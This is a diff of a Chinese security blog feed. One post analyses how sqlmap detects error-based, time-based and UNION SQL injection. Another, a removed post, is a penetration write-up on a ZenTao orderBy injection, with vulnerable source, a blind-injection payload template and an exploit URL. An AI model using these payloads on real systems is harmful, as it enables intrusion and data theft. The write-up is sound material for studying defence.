src=&quot;https://pic1.zhimg.com/v2-889c61c0043a4bbae05fd30cecbbaac5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1478&quot; data-rawheight=&quot;762&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-889c61c0043a4bbae05fd30cecbbaac5&quot; data-watermark-src=&quot;v2-4264d6978637ad50c6159d8c55c8ca5d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在代码批注中我们进行详细的解释，为了让大家看得更清楚，我们把代码转变为流程图：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6e395260b8da555410426a857d7211f9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;510&quot; data-rawheight=&quot;825&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e395260b8da555410426a857d7211f9&quot; data-watermark-src=&quot;v2-1cfc26e92a86a341a395d991fb6cc5f5&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中最容易被遗忘的可能并不是正负请求的对比，而是正请求与模版页面的对比，负请求与错误请求的对比和错误请求与模版页面的对比，因为广泛存在一种情况是类似文件包含模式的情况，不同的合理输入的结果有大概率不相同，且每一次输入的结果如果报错都会跳转到某一个默认页面（存在默认参数），这种情况仅仅用正负请求来区分页面不同是完全不够用的，还需要各种情形与模版页面的比较来确定。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;针对 GREP 型（报错注入）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;针对报错注入其实非常好识别，在报错注入检测的过程中，我们会发现他的 &lt;code class=&quot;inline&quot;&gt;response&lt;/code&gt; 子标签中，包含着是 &lt;code class=&quot;inline&quot;&gt;grep&lt;/code&gt; 子标签：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
+&amp;lt;test&amp;gt;
+    &amp;lt;title&amp;gt;MySQL &amp;amp;gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&amp;lt;/title&amp;gt;
+    &amp;lt;stype&amp;gt;2&amp;lt;/stype&amp;gt;
+    &amp;lt;level&amp;gt;5&amp;lt;/level&amp;gt;
+    &amp;lt;risk&amp;gt;1&amp;lt;/risk&amp;gt;
+    &amp;lt;clause&amp;gt;1,2,3,9&amp;lt;/clause&amp;gt;
+    &amp;lt;where&amp;gt;1&amp;lt;/where&amp;gt;
+    &amp;lt;vector&amp;gt;AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(&#39;[DELIMITER_START]&#39;,([QUERY]),&#39;[DELIMITER_STOP]&#39;)) USING utf8)))&amp;lt;/vector&amp;gt;
+    &amp;lt;request&amp;gt;
+        &amp;lt;payload&amp;gt;AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(&#39;[DELIMITER_START]&#39;,(SELECT (ELT([RANDNUM]=[RANDNUM],1))),&#39;[DELIMITER_STOP]&#39;)) USING utf8)))&amp;lt;/payload&amp;gt;
+    &amp;lt;/request&amp;gt;
+    &amp;lt;response&amp;gt;
+        &amp;lt;grep&amp;gt;[DELIMITER_START](?P&amp;amp;lt;result&amp;amp;gt;.*?)[DELIMITER_STOP]&amp;lt;/grep&amp;gt;
+    &amp;lt;/response&amp;gt;
+    &amp;lt;details&amp;gt;
+        &amp;lt;dbms&amp;gt;MySQL&amp;lt;/dbms&amp;gt;
+        &amp;lt;dbms_version&amp;gt;&amp;amp;gt;= 5.7.8&amp;lt;/dbms_version&amp;gt;
+    &amp;lt;/details&amp;gt;
+&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;我们发现子标签 &lt;code class=&quot;inline&quot;&gt;grep&lt;/code&gt; 中是正则表达式，可以直接从整个请求中通过 grep 中的正则提取出对应的内容，如果成功提取出了对应内容，则说明该参数可以进行注入。&lt;/p&gt;&lt;p&gt;在具体代码中，其实非常直观可以看到：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dbdc68e369293fa89fd0683922aa541b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1132&quot; data-rawheight=&quot;451&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-dbdc68e369293fa89fd0683922aa541b&quot; data-watermark-src=&quot;v2-b46b7662e0a4c22eb8b9979bfed695eb&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;再 sqlmap 的实现中其实并不是仅仅检查页面内容就足够的，除了页面内容之外，检查如下项：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;HTTP 的错误页面&lt;/li&gt;&lt;li&gt;Headers 中的内容&lt;/li&gt;&lt;li&gt;重定向信息&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;针对 TIME 型（时间盲注，HeavilyQuery）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然时间盲注我们可以很容易猜到应该怎么处理：如果发出了请求导致延迟了 X 秒，并且响应延迟的时间是我们预期的时间，那么就可以判定这个参数是一个时间注入点。&lt;/p&gt;&lt;p&gt;但是仅仅是这样就可以了嘛？当然我们需要了解的是 sqlmap 如何设置这个 X 作为时间点（请看下面这个函数，位于 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 中）：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0291e85a6985aa5192c135f7356b8681_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1390&quot; data-rawheight=&quot;655&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0291e85a6985aa5192c135f7356b8681&quot; data-watermark-src=&quot;v2-22eec861df21fd6569007ffdf640ec21&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我们发现，它里面有一个数学概念：&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E6%A8%99%E6%BA%96%E5%B7%AE&quot;&gt;标准差&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;简单来说，标准差是一组数值自平均值分散开来的程度的一种测量观念。一个较大的标准差，代表大部分的数值和其平均值之间差异较大；一个较小的标准差，代表这些数值较接近平均值。例如，两组数的集合{0, 5, 9, 14}和{5, 6, 8, 9}其平均值都是7，但第二个集合具有较小的标准差。述“相差k个标准差”，即在 X̄ ± kS 的样本（Sample）范围内考量。标准差可以当作不确定性的一种测量。例如在物理科学中，做重复性测量时，测量数值集合的标准差代表这些测量的精确度。当要决定测量值是否符合预测值，测量值的标准差占有决定性重要角色：如果测量平均值与预测值相差太远（同时与标准差数值做比较），则认为测量值与预测值互相矛盾。这很容易理解，因为如果测量值都落在一定数值范围之外，可以合理推论预测值是否正确。&lt;/blockquote&gt;&lt;p&gt;根据注释和批注中的解释，我们发现我们需要设定一个最小 SLEEPTIME 应该至少大于 &lt;code class=&quot;inline&quot;&gt;样本内平均响应时间 + 7 * 样本标准差&lt;/code&gt;，这样就可以保证过滤掉 &lt;code class=&quot;inline&quot;&gt;99.99%&lt;/code&gt; 的无延迟请求。&lt;/p&gt;&lt;p&gt;当然除了这一点，我们还发现&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
+delta = threadData.lastQueryDuration - conf.timeSec
+if Backend.getIdentifiedDbms() in (DBMS.MYSQL,):  # MySQL&#39;s SLEEP(X) lasts 0.05 seconds shorter on average
+    delta += 0.05
+return delta &amp;gt;= 0&lt;/code&gt;&lt;p&gt;这一段代码作为 mysql 的 Patch 存在 &lt;code class=&quot;inline&quot;&gt;# MySQL&#39;s SLEEP(X) lasts 0.05 seconds shorter on average&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;如果我们要自己实现时间盲注的检测的话，这一点也是必须注意和实现的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;针对 UNION 型（UNION Query）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;UNION 注入可以说是 sqlmap 中最复杂的了，同时也是最经典的注入情形。&lt;/p&gt;&lt;p&gt;其实关于 UNION 注入的检测，和我们一开始学习 SQL 注入的方法是一样的，猜解列数，猜解输出点在列中位置。实际在 sqlmap 中也是按照这个来进行漏洞检测的，具体的测试方法位于：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-110a1145556b933e5ac2e73ff298f714_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;833&quot; data-rawheight=&quot;526&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-110a1145556b933e5ac2e73ff298f714&quot; data-watermark-src=&quot;v2-f370bebaeaefc7c866ba0c982e1a2c68&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;跟入 &lt;code class=&quot;inline&quot;&gt;unionTest()&lt;/code&gt; 中我们发现如下操作&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
+def unionTest(comment, place, parameter, value, prefix, suffix):
+    &quot;&quot;&quot;
+    This method tests if the target URL is affected by an union
+    SQL injection vulnerability. The test is done up to 3*50 times
+    &quot;&quot;&quot;
+​
+    if conf.direct:
+        return
+​
+    kb.technique = PAYLOAD.TECHNIQUE.UNION
+    validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
+​
+    if validPayload:
+        validPayload = agent.removePayloadDelimiters(validPayload)
+​
+    return validPayload, vector&lt;/code&gt;&lt;p&gt;最核心的逻辑位于 &lt;code class=&quot;inline&quot;&gt;_unionTestByCharBruteforce&lt;/code&gt; 中，继续跟入，我们发现其检测的大致逻辑如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c529ff3eaf28512368b2b2045da53140_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1501&quot; data-rawheight=&quot;674&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c529ff3eaf28512368b2b2045da53140&quot; data-watermark-src=&quot;v2-6e6e8a25b589fb0a620495fd84a30b6d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;别急，我们一步一步来分析！&lt;/p&gt;&lt;h2&gt;&lt;b&gt;猜列数&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我相信做过渗透测试的读者基本对这个词都非常非常熟悉，如果有疑问或者不清楚的请自行百度，笔者再次不再赘述关于 SQL 注入基本流程的部分。&lt;/p&gt;&lt;p&gt;为什么要把一件这么简单的事情单独拿出来说呢？当然这预示着 sqlmap 并不是非常简单的在处理这一件事情，因为作为一个渗透测试人员，当然可以很容易靠肉眼分辨出很多事情，但是这些事情在计算机看来却并不是那么容易可以判断的：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;使用 ORDER BY 查询，直接通过与模版页面的比较来获取列数。&lt;/li&gt;&lt;li&gt;当 ORDER BY 失效的时候，使用多次 &lt;code class=&quot;inline&quot;&gt;UNION SELECT&lt;/code&gt; 不同列数，获取多个 Ratio，通过区分 Ratio 来区分哪一个是正确的列数。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;实际在使用的过程中，&lt;code class=&quot;inline&quot;&gt;ORDER BY&lt;/code&gt; 的核心逻辑如下，关于其中页面比较技术我们就不赘述了，不过值得一提的是 sqlmap 在猜列数的时候，使用的是二分法（笔者看了一下，二分法这部分这似乎是七年前的代码）。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c8fa713e11133d2c091345e8dc9fc2a5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1349&quot; data-rawheight=&quot;631&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c8fa713e11133d2c091345e8dc9fc2a5&quot; data-watermark-src=&quot;v2-16cf9c8de071ee650d2e9c30bfd68109&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;除此之外呢，如果 &lt;code class=&quot;inline&quot;&gt;ORDER BY&lt;/code&gt; 失效，将会计算至少五个（从 &lt;code class=&quot;inline&quot;&gt;lowerCount&lt;/code&gt; 到 &lt;code class=&quot;inline&quot;&gt;upperCount&lt;/code&gt;）Payload 为 &lt;code class=&quot;inline&quot;&gt;UNION SELECT (NULL,) * [COUNT]&lt;/code&gt;，的请求，这些请求的对应 RATIO（与模版页面相似度）会汇总存储在 &lt;code class=&quot;inline&quot;&gt;ratios&lt;/code&gt; 中，同时 &lt;code class=&quot;inline&quot;&gt;items&lt;/code&gt; 中存储 &lt;code class=&quot;inline&quot;&gt;列数 和 ratio&lt;/code&gt; 形成的 &lt;code class=&quot;inline&quot;&gt;tuple&lt;/code&gt;，经过一系列的算法，尽可能寻找出“与众不同（正确猜到列数）”的页面。具体的算法与批注如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9ece5b4a703e99bd41426ac3912dbe0e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1427&quot; data-rawheight=&quot;702&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9ece5b4a703e99bd41426ac3912dbe0e&quot; data-watermark-src=&quot;v2-b38dc8a4df45594a0df0b4d234fbf36a&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我们发现，上面代码表达的核心思想就是 &lt;b&gt;利用与模版页面比较的内容相似度寻找最最不同的那一个请求&lt;/b&gt;。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;定位输出点&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;假如一切顺利，我们通过上面的步骤成功找到了列数，接下来就应该寻找输出点，当然输出点的寻找也是需要额外讨论的。其实基本逻辑很容易对不对？我们只需要将 &lt;code class=&quot;inline&quot;&gt;UNION SELECT NULL, NULL, NULL, NULL, ...&lt;/code&gt; 中的各种 &lt;code class=&quot;inline&quot;&gt;NULL&lt;/code&gt; 依次替换，然后在结果中寻找被我们插入的随机的字符串，就可以很容易定位到输入出点的位置。实际上这一部分的确认逻辑是位于下图中的函数的 &lt;code class=&quot;inline&quot;&gt;_unionConfirm&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e3b392f7ef6cd59242acadc60c82d38b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;783&quot; data-rawheight=&quot;441&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e3b392f7ef6cd59242acadc60c82d38b&quot; data-watermark-src=&quot;v2-98d8b68fa58780554eece325888eb731&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中主要的逻辑是一个叫 &lt;code class=&quot;inline&quot;&gt;_unionPosition&lt;/code&gt; 的函数，在这个函数中，负责定位输出点的位置，使用的基本方法就是我们在开头提到方法，受限于篇幅，我们就不再展开叙述了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03 结束语&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;其实按笔者原计划，本系列文章并没有结束，因为还有关于 sqlmap 中其他技术没有介绍：“数据持久化”，“action() - Exploit 技术”，“常见漏洞利用分析（udf，反弹 shell 等）”。但是由于内容是在太过庞杂，笔者计划暂且搁置一下，实际上现有的文章已经足够把 sqlmap 的 SQL 注入检测最核心的也是最有意义的自动化逻辑说清楚了，我想读读者读完之后肯定会有自己的收获。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 再见👋&lt;/b&gt;&lt;/h2&gt;</description>
+<author>小蘑菇</author>
+<guid isPermaLink="false">2018-09-25-45291193</guid>
+<pubDate>Tue, 25 Sep 2018 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>sqlmap 内核分析 II: 核心原理-页面相似度算法实践</title>
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-09-10-44157153.html</link>
@@ -680,198 +931,6 @@ window.name = &#39;baidu&#39;;
 <author>小蘑菇</author>
 <guid isPermaLink="false">2018-03-13-34495488</guid>
 <pubDate>Tue, 13 Mar 2018 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>从SQL注入到Getshell：记一次禅道系统的渗透</title>
-<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-07-34275981.html</link>
-<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34275981&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c9c286b86cab690e0da2551d738fc1d1_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：&lt;/b&gt; &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/03f40f07ca96c5b31c8892400eec8c1d&quot; data-hash=&quot;03f40f07ca96c5b31c8892400eec8c1d&quot; data-hovercard=&quot;p$b$03f40f07ca96c5b31c8892400eec8c1d&quot;&gt;@L3m0n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;此过程为某站点的渗透记录，过程一波三折，但归根结底都是粗心大意造成的，不过自我认为在这个排坑的过程中也学习到了很多。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;确认版本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先可以通过接口来确认一下当前禅道的版本。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?mode=getconfig&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c6d7fb7d4b2d437eb33d3644630813b4_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1582&quot;&gt;&lt;h2&gt;&lt;b&gt;SQL注入分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;网上之前有过一个&lt;code class=&quot;inline&quot;&gt;9.1.2&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数的分析，但是没想到&lt;code class=&quot;inline&quot;&gt;9.2.1&lt;/code&gt;也存在此问题，(&lt;code class=&quot;inline&quot;&gt;2018.3.2&lt;/code&gt;号看到目前最新版本是&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;)。&lt;/p&gt;&lt;p&gt;出问题的地方是此文件的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数：\lib\base\dao\dao.class.php&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;public function orderBy($order)
-{
-    if($this-&amp;gt;inCondition and !$this-&amp;gt;conditionIsTrue) return $this;
-
-    $order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);
-
-    /* Add &quot;`&quot; in order string. */
-    /* When order has limit string. */
-    $pos    = stripos($order, &#39;limit&#39;);
-    $orders = $pos ? substr($order, 0, $pos) : $order;
-    $limit  = $pos ? substr($order, $pos) : &#39;&#39;;
-    $orders = trim($orders);
-    if(empty($orders)) return $this;
-    if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);
-
-    $orders = explode(&#39;,&#39;, $orders);
-    foreach($orders as $i =&amp;gt; $order)
-    {
-        $orderParse = explode(&#39; &#39;, trim($order));
-        foreach($orderParse as $key =&amp;gt; $value)
-        {
-            $value = trim($value);
-            if(empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) continue;
-
-            $field = $value;
-            /* such as t1.id field. */
-            if(strpos($value, &#39;.&#39;) !== false) list($table, $field) = explode(&#39;.&#39;, $field);
-            if(strpos($field, &#39;`&#39;) === false) $field = &quot;`$field`&quot;;
-
-            $orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field :  $field;
-            unset($table);
-        }
-        $orders[$i] = join(&#39; &#39;, $orderParse);
-        if(empty($orders[$i])) unset($orders[$i]);
-    }
-    $order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;
-
-    $this-&amp;gt;sql .= &#39; &#39; . DAO::ORDERBY . &quot; $order&quot;;
-    return $this;
-}&lt;/code&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;后未做严格的过滤与判断，然后拼接到了&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;后面导致产生注入.&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;&lt;/code&gt;&lt;p&gt;看了一下&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;的修补是对limit进行正则限制，但是事实上感觉此处正则是写了一个bug，比如正常调用&lt;code class=&quot;inline&quot;&gt;orderBy($order)&lt;/code&gt;的时候，其中&lt;code class=&quot;inline&quot;&gt;$order&lt;/code&gt;为&lt;code class=&quot;inline&quot;&gt;abc desc limit 1,1&lt;/code&gt;的时候，进入&lt;code class=&quot;inline&quot;&gt;$limit&lt;/code&gt;则是&lt;code class=&quot;inline&quot;&gt;limit 1,1&lt;/code&gt;，导致匹配失败。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/* Add &quot;`&quot; in order string. */
-/* When order has limit string. */
-$pos    = stripos($order, &#39;limit&#39;);
-$orders = $pos ? substr($order, 0, $pos) : $order;
-$limit  = $pos ? substr($order, $pos) : &#39;&#39;;
-if($limit and !preg_match(&#39;/^[0-9]+ *(, *[0-9]+)?$/&#39;, $limit)) $limit = &#39;&#39;;&lt;/code&gt;&lt;p&gt;如果想要造成前台注入（无需登录）的话，就得先看看禅道开放了哪些接口，看是否有调用&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数。&lt;/p&gt;&lt;p&gt;\zentao\module\common\model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function isOpenMethod($module, $method)
-{
-   if($module == &#39;user&#39; and strpos(&#39;login|logout|deny|reset&#39;, $method) !== false) return true;
-   if($module == &#39;api&#39;  and $method == &#39;getsessionid&#39;) return true;
-   if($module == &#39;misc&#39; and $method == &#39;ping&#39;)  return true;
-   if($module == &#39;misc&#39; and $method == &#39;checktable&#39;) return true;
-   if($module == &#39;misc&#39; and $method == &#39;qrcode&#39;) return true;
-   if($module == &#39;misc&#39; and $method == &#39;about&#39;) return true;
-   if($module == &#39;misc&#39; and $method == &#39;checkupdate&#39;) return true;
-   if($module == &#39;misc&#39; and $method == &#39;changelog&#39;) return true;
-   if($module == &#39;sso&#39; and $method == &#39;login&#39;)  return true;
-   if($module == &#39;sso&#39; and $method == &#39;logout&#39;) return true;
-   if($module == &#39;sso&#39; and $method == &#39;bind&#39;) return true;
-   if($module == &#39;sso&#39; and $method == &#39;gettodolist&#39;) return true;
-   if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;
-
-   if($this-&amp;gt;loadModel(&#39;user&#39;)-&amp;gt;isLogon() or ($this-&amp;gt;app-&amp;gt;company-&amp;gt;guest and $this-&amp;gt;app-&amp;gt;user-&amp;gt;account == &#39;guest&#39;))
-   {
-       if(stripos($method, &#39;ajax&#39;) !== false) return true;
-       if(stripos($method, &#39;downnotify&#39;) !== false) return true;
-       if($module == &#39;tutorial&#39;) return true;
-       if($module == &#39;block&#39;) return true;
-       if($module == &#39;product&#39; and $method == &#39;showerrornone&#39;) return true;
-   }
-   return false;
-}&lt;/code&gt;&lt;p&gt;其中的&lt;code class=&quot;inline&quot;&gt;if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;&lt;/code&gt;，也就是本次漏洞的主角，继续跟进。&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;class block extends control
-{
-    public function __construct($moduleName = &#39;&#39;, $methodName = &#39;&#39;)
-    {
-        parent::__construct($moduleName, $methodName);
-        $this-&amp;gt;selfCall = strpos($this-&amp;gt;server-&amp;gt;http_referer, common::getSysURL()) === 0 || $this-&amp;gt;session-&amp;gt;blockModule;
-        if($this-&amp;gt;methodName != &#39;admin&#39; and $this-&amp;gt;methodName != &#39;dashboard&#39; and !$this-&amp;gt;selfCall and !$this-&amp;gt;loadModel(&#39;sso&#39;)-&amp;gt;checkKey()) die(&#39;&#39;);
-    }
-    public function main($module = &#39;&#39;, $id = 0)
-    {
-        ...
-       $mode = strtolower($this-&amp;gt;get-&amp;gt;mode);
-       if($mode == &#39;getblocklist&#39;)
-       {   
-           ...
-       }   
-       elseif($mode == &#39;getblockform&#39;)
-       {   
-           ...
-       }   
-       elseif($mode == &#39;getblockdata&#39;)
-       {
-           $code = strtolower($this-&amp;gt;get-&amp;gt;blockid);
-    
-           $params = $this-&amp;gt;get-&amp;gt;param;
-           $params = json_decode(base64_decode($params));
-            ....
-           $this-&amp;gt;viewType    = (isset($params-&amp;gt;viewType) and $params-&amp;gt;viewType == &#39;json&#39;) ? &#39;json&#39; : &#39;html&#39;;
-           $this-&amp;gt;params      = $params;
-           $this-&amp;gt;view-&amp;gt;code  = $this-&amp;gt;get-&amp;gt;blockid;
-           $this-&amp;gt;view-&amp;gt;title = $this-&amp;gt;get-&amp;gt;blockTitle;
-    
-           $func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;
-           if(method_exists(&#39;block&#39;, $func))
-           {
-               $this-&amp;gt;$func($module);
-           }
-           else
-           {
-               $this-&amp;gt;view-&amp;gt;data = $this-&amp;gt;block-&amp;gt;$func($module, $params);
-           }
-       }
-    }
-}&lt;/code&gt;&lt;p&gt;首先看&lt;code class=&quot;inline&quot;&gt;__construct&lt;/code&gt;中，&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;selfCall&lt;/code&gt;是在验证&lt;code class=&quot;inline&quot;&gt;referer&lt;/code&gt;的值，如果为真的话则后面的&lt;code class=&quot;inline&quot;&gt;if&lt;/code&gt;将不会进入&lt;code class=&quot;inline&quot;&gt;die&lt;/code&gt;语句里面&lt;/p&gt;&lt;p&gt;接下来跟进&lt;code class=&quot;inline&quot;&gt;main&lt;/code&gt;函数，可以看到最后的&lt;code class=&quot;inline&quot;&gt;$func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;&lt;/code&gt;，会对一些函数进行调用，与此同时，我们搜索&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;的调用的时候可以发现&lt;code class=&quot;inline&quot;&gt;printCaseBlock&lt;/code&gt;函数的存在&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-dc18e0f1b6d8b747c6ec554acae5d139_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2246&quot;&gt;&lt;p&gt;所以前台注入的整个过程便比较清晰了，那么如何利用?&lt;/p&gt;&lt;h2&gt;&lt;b&gt;SQL注入利用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回过头来，因为禅道有windows直接的一键化安装程序，其数据库使用的也是&lt;code class=&quot;inline&quot;&gt;root&lt;/code&gt;权限，导致可直接导出shell，但是如果没有这么高权限的时候，对于这个注入应该如何出数据。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &#39;select user()&#39;
-param = &#39;{&quot;orderBy&quot;:&quot;order limit 1;select (if(ord(mid((%s),%d,1))=%d,sleep(2),1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) ,1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) &lt;/code&gt;&lt;p&gt;禅道是支持多语句的，这也为后面的利用提供方便。&lt;/p&gt;&lt;p&gt;注入出数据库名和表段名后，当我想继续注入出用户账号密码的时候，意外地发现没有出数据。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;sql = &#39;select 12345 from zt_user&#39;&lt;/code&gt;&lt;p&gt;还是没有出数据，猜测是管理员改了表前缀，所以想去通过&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;查询一下表名，但是意外地发现，也不能读取？难道被删了？但是我还是想知道一下表前缀。&lt;/p&gt;&lt;p&gt;请求的时候加了一个单引号，并且加上referer，看一下报错信息。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxJyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=
-
-其中param经过BASE64解码得到
-{&quot;orderBy&quot;:&quot;order limit 1,1&#39;&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2b635f910bb80ada4553155d1c748f29_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2710&quot;&gt;&lt;p&gt;因为PDO的关系，SQL中的表名是&lt;code class=&quot;inline&quot;&gt;%s&lt;/code&gt;替代的，所以未能够得到库名。&lt;/p&gt;&lt;p&gt;那么就利用报错去得到当前SQl语句里面查询的表名，比如利用&lt;code class=&quot;inline&quot;&gt;polygon&lt;/code&gt;函数。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-adbcf88a750df6340c76cb8c7da63235_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2696&quot;&gt;&lt;p&gt;此注入点可以理解为limit后的注入点，因为使用多语句的话，报错效果不明显，所以就直接在limit后面进行注入。&lt;/p&gt;&lt;code 